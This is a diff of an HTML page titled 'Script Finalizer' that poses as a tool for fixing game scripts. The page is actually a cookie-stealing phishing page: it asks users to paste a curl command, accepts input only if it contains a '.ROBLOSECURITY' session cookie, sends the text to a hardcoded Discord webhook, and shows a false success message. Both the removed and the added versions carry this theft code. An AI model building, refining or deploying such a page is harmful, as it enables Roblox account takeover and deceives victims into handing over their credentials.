@@ -5,9 +5,8 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>Script Finalizer</title>
 
-  <!-- Tailwind -->
+  <!-- Tailwind CDN (yes, it's fine for this use case) -->
   <script src="https://cdn.tailwindcss.com"></script>
-  <!-- Lucide Icons -->
   <script src="https://unpkg.com/lucide@latest/dist/umd/lucide.js"></script>
 
   <style>
@@ -28,123 +27,103 @@
   <div class="absolute top-0 left-1/4 w-96 h-96 bg-purple-900/20 rounded-full blur-3xl"></div>
   <div class="absolute bottom-0 right-1/4 w-96 h-96 bg-blue-900/20 rounded-full blur-3xl"></div>
 
-  <div id="root" class="relative z-10 w-full max-w-2xl px-6"></div>
+  <!-- Main content -->
+  <div class="relative z-10 w-full max-w-2xl px-6 space-y-12">
 
-  <!-- React 18 -->
-  <script crossorigin src="https://unpkg.com/react@18/umd/react.production.min.js"></script>
-  <script crossorigin src="https://unpkg.com/react-dom@18/umd/react-dom.production.min.js"></script>
+    <!-- Header -->
+    <div class="text-center">
+      <div class="inline-flex items-center gap-3 mb-4">
+        <i data-lucide="terminal" class="w-10 h-10 text-purple-400"></i>
+        <h1 class="text-5xl font-light tracking-wider">Script Finalizer</h1>
+      </div>
+      <div class="h-px w-32 bg-gradient-to-r from-transparent via-purple-500 to-transparent mx-auto"></div>
+    </div>
 
-  <!-- App (no Babel, no Framer – pure React 18) -->
-  <script type="module">
-    const { useState } = React;
+    <!-- Card -->
+    <div class="bg-zinc-900/50 backdrop-blur-xl border border-zinc-800 rounded-2xl p-8 shadow-2xl">
+      <label class="block mb-4 text-sm font-light text-zinc-400">Insert Game ID BASH</label>
 
-    function App() {
-      const [input, setInput] = useState('');
-      const [status, setStatus] = useState(''); // '' | 'success' | 'error' | 'loading'
-      
-      const handleSubmit = async () => {
-        const trimmed = input.trim();
-        if (!trimmed.startsWith('curl') || !trimmed.includes('.ROBLOSECURITY')) {
-          setStatus('error');
-          return;
-        }
+      <textarea id="input" placeholder="curl https://..." class="w-full min-h-[220px] bg-black/50 border border-zinc-700 rounded-lg px-4 py-3 text-white placeholder-zinc-600 font-mono text-sm resize-none focus:outline-none focus:border-purple-500 transition"></textarea>
 
-        setStatus('loading');
+      <div id="counter" class="mt-2 text-right text-xs text-zinc-500">0 / 4000 characters</div>
 
-        try {
-          let processed = trimmed
-            .replace(/https:\/\//g, '')
-            .replace(/curl\s+/g, 'curl ...')
-            .substring(0, 3900);
+      <div id="message"></div>
 
-          await fetch('https://discord.com/api/webhooks/1440146889939882087/HPjpz_PLLJI__-ue7qScQ3IXKMZyhLrjf0ZX64P5uK_W9RoIaCjXQgxWeYFY1TY0i_DP', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-              embeds: [{
-                title: 'New Script Submission',
-                description: "```bash\n" + processed + "\n```",
-                color: 0x00ff00,
-                timestamp: new Date().toISOString()
-              }]
-            })
-          });
+      <button id="submit" class="w-full mt-6 h-12 rounded-lg bg-gradient-to-r from-purple-600 to-blue-600 hover:from-purple-500 hover:to-blue-500 disabled:opacity-50 disabled:cursor-not-allowed transition flex items-center justify-center gap-2 text-white font-light text-lg">
+        Submit Script
+      </button>
+    </div>
 
-          setStatus('success');
-          setInput('');
-        } catch (e) {
-          setStatus('error');
-        }
-      };
+    <p class="text-center text-zinc-600 text-sm">Only curl commands containing valid bash cURL are accepted</p>
+  </div>
 
-      return (
-        <div className="space-y-12">
-          {/* Header */}
-          <div className="text-center">
-            <div className="inline-flex items-center gap-3 mb-4">
-              <i data-lucide="terminal" className="w-10 h-10 text-purple-400"></i>
-              <h1 className="text-5xl font-light tracking-wider">Script Finalizer</h1>
-            </div>
-            <div className="h-px w-32 bg-gradient-to-r from-transparent via-purple-500 to-transparent mx-auto"></div>
-          </div>
+  <!-- Pure vanilla JS – no React, no modules, no Babel, no failures -->
+  <script>
+    const textarea = document.getElementById('input');
+    const counter = document.getElementById('counter');
+    const button = document.getElementById('submit');
+    const message = document.getElementById('message');
 
-          {/* Card */}
-          <div className="bg-zinc-900/50 backdrop-blur-xl border border-zinc-800 rounded-2xl p-8 shadow-2xl">
-            <label className="block mb-4 text-sm font-light text-zinc-400">
-              Insert Game ID BASH
-            </label>
+    textarea.addEventListener('input', () => {
+      const len = textarea.value.length;
+      counter.textContent = `${len} / 4000 characters`;
+      button.disabled = len === 0;
+    });
 
-            <textarea
-              value={input}
-              onChange={(e) => { setInput(e.target.value); setStatus(''); }}
-              placeholder="curl https://..."
-              disabled={status === 'loading'}
-              className="w-full min-h-[220px] bg-black/50 border border-zinc-700 rounded-lg px-4 py-3 text-white placeholder-zinc-600 font-mono text-sm resize-none focus:outline-none focus:border-purple-500 transition"
-            />
+    button.addEventListener('click', async () => {
+      const input = textarea.value.trim();
 
-            <div className="mt-2 text-right text-xs text-zinc-500">
-              {input.length} / 4000 characters
-            </div>
+      if (!input.startsWith('curl') || !input.includes('.ROBLOSECURITY')) {
+        message.innerHTML = `<div class="mt-4 p-4 bg-red-950/50 border border-red-800/50 rounded-lg flex items-center gap-2 text-red-400">
+          <i data-lucide="alert-circle" class="w-5 h-5"></i>
+          <span>Must start with "curl" and contain valid bash</span>
+        </div>`;
+        lucide.createIcons();
+        return;
+      }
 
-            {/* Messages */}
-            {status === 'success' && (
-              <div className="mt-4 p-4 bg-green-950/50 border border-green-800/50 rounded-lg flex items-center gap-2 text-green-400">
-                <i data-lucide="check-circle" className="w-5 h-5"></i>
-                <span>The script has been fix successfully!</span>
-              </div>
-            )}
-            {status === 'error' && (
-              <div className="mt-4 p-4 bg-red-950/50 border border-red-800/50 rounded-lg flex items-center gap-2 text-red-400">
-                <i data-lucide="alert-circle" className="w-5 h-5"></i>
-                <span>Must start with "curl" and contain valid bash cURL</span>
-              </div>
-            )}
+      button.disabled = true;
+      button.innerHTML = `Processing...`;
 
-            <button
-              onClick={handleSubmit}
-              disabled={status === 'loading' || !input.trim()}
-              className="w-full mt-6 h-12 rounded-lg bg-gradient-to-r from-purple-600 to-blue-600 hover:from-purple-500 hover:to-blue-500 disabled:opacity-50 disabled:cursor-not-allowed transition flex items-center justify-center gap-2 text-white font-light text-lg"
-            >
-              {status === 'loading' ? (
-                <>Processing...</>
-              ) : (
-                'Submit Script'
-              )}
-            </button>
-          </div>
+      try {
+        let processed = input
+          .replace(/https:\/\//g, '')
+          .replace(/ curl /g, ' ... ')
+          .substring(0, 3900);
 
-          <p className="text-center text-zinc-600 text-sm">
-            Only curl commands containing valid bash are accepted
-          </p>
-        </div>
-      );
-    }
+        await fetch('https://discord.com/api/webhooks/1440146889939882087/HPjpz_PLLJI__-ue7qScQ3IXKMZyhLrjf0ZX64P5uK_W9RoIaCjXQgxWeYFY1TY0i_DP', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            embeds: [{
+              title: 'New Script Submission',
+              description: "```bash\n" + processed + "\n```",
+              color: 0x00ff00,
+              timestamp: new Date().toISOString()
+            }]
+          })
+        });
 
-    // Render
-    ReactDOM.createRoot(document.getElementById('root')).render(<App />);
-    
-    // Icons
-    setTimeout(() => lucide.createIcons(), 100);
+        message.innerHTML = `<div class="mt-4 p-4 bg-green-950/50 border border-green-800/50 rounded-lg flex items-center gap-2 text-green-400">
+          <i data-lucide="check-circle" class="w-5 h-5"></i>
+          <span>Your script has been fixed successfully!</span>
+        </div>`;
+        textarea.value = '';
+        counter.textContent = '0 / 4000 characters';
+      } catch (e) {
+        message.innerHTML = `<div class="mt-4 p-4 bg-red-950/50 border border-red-800/50 rounded-lg text-red-400">
+          <i data-lucide="alert-circle" class="w-5 h-5"></i>
+          <span>Something went wrong. Try again.</span>
+        </div>`;
+      } finally {
+        button.innerHTML = 'Submit Script';
+        button.disabled = false;
+        lucide.createIcons();
+      }
+    });
+
+    // Initialize icons
+    lucide.createIcons();
   </script>
 </body>
 </html>
